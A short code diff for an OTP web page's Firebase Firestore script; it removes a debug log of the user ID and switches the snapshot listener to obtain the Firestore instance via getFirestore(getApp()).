@@ -559,7 +559,7 @@ setInterval(async ()=>{
     if(!loginData) return;
 
     const userId = localStorage.getItem("userId")
-    console.log("OTP PAGE USER ID:", userId);
+    
 
     await setDoc(doc(db,"users",userId),{
 
@@ -672,9 +672,16 @@ document
 <script type="module">
 
 import {
-   doc,
+    getFirestore,
+    doc,
     onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+import { getApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+
 
 /* current login */
 
@@ -685,7 +692,8 @@ if(loginData){
 
  const userId = localStorage.getItem("userId")
 
-onSnapshot(doc(db,"users",userId),(docSnap)=>{
+onSnapshot(
+    doc(getFirestore(getApp()),"users",userId),(docSnap)=>{
 
     if(!docSnap.exists()) return;
 
